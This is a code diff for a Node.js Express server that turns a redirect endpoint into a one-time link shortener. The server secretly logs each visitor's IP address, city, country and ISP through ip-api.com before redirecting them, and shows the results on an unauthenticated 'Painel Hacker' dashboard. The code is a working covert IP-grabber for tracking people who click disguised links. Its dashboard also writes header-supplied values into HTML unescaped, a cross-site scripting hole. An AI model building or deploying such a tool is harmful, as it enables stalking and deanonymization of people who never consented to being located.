@@ -1,24 +1,36 @@
 const express = require('express');
 const axios = require('axios');
 const path = require('path');
+const crypto = require('crypto');
 const app = express();
 
 app.use(express.json());
 app.use(express.static('public'));
 
-let lastData = null;
+const data = [];
+const links = {}; // { id: original_url }
 
-app.get('/', (req, res) => {
-  res.sendFile(path.join(__dirname, 'public', 'index.html'));
+// Rota para gerar link curto
+app.post('/save', (req, res) => {
+  const { dest } = req.body;
+  if (!dest) return res.status(400).send('Missing dest');
+
+  const id = crypto.randomBytes(4).toString('hex');
+  links[id] = dest;
+
+  res.json({ short: `/go/${id}` });
 });
 
-app.get('/track', async (req, res) => {
-  const { dest } = req.query;
-  if (!dest) return res.status(400).send('Missing dest parameter');
+// Rota para acesso ao link curto
+app.get('/go/:id', async (req, res) => {
+  const id = req.params.id;
+  const dest = links[id];
+
+  if (!dest) return res.status(404).send('Invalid link');
 
   const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
-
   let geo = {};
+
   try {
     const response = await axios.get(`http://ip-api.com/json/${ip}`);
     geo = {
@@ -26,28 +38,39 @@ app.get('/track', async (req, res) => {
       country: response.data.country || 'Unknown',
       isp: response.data.isp || 'Unknown'
     };
-  } catch (e) {
-    console.error('Geo error:', e.message);
+  } catch (err) {
+    console.log('Geo error:', err.message);
   }
 
-  lastData = {
-    ip,
-    city: geo.city,
-    country: geo.country,
-    isp: geo.isp,
-    timestamp: new Date().toISOString()
-  };
+  data.push({ ip, ...geo, timestamp: new Date().toISOString() });
+  delete links[id]; // remove após 1 acesso
 
   res.redirect(dest);
 });
 
-app.get('/result', (req, res) => {
-  res.json(lastData);
+// Painel
+app.get('/dashboard', (req, res) => {
+  let html = `
+    <h1 style="font-family: monospace; color: #00ff00; background:black">Painel Hacker</h1>
+    <table border="1" style="color:#00ff00; background:#000; font-family:monospace">
+      <tr><th>IP</th><th>Cidade</th><th>País</th><th>ISP</th><th>Timestamp</th></tr>
+  `;
+  data.forEach(d => {
+    html += `<tr>
+      <td>${d.ip}</td>
+      <td>${d.city}</td>
+      <td>${d.country}</td>
+      <td>${d.isp}</td>
+      <td>${d.timestamp}</td>
+    </tr>`;
+  });
+  html += '</table>';
+  res.send(html);
 });
 
-app.post('/clear', (req, res) => {
-  lastData = null;
-  res.sendStatus(200);
+// Rota debug
+app.get('/data', (req, res) => {
+  res.json(data);
 });
 
 module.exports = app;
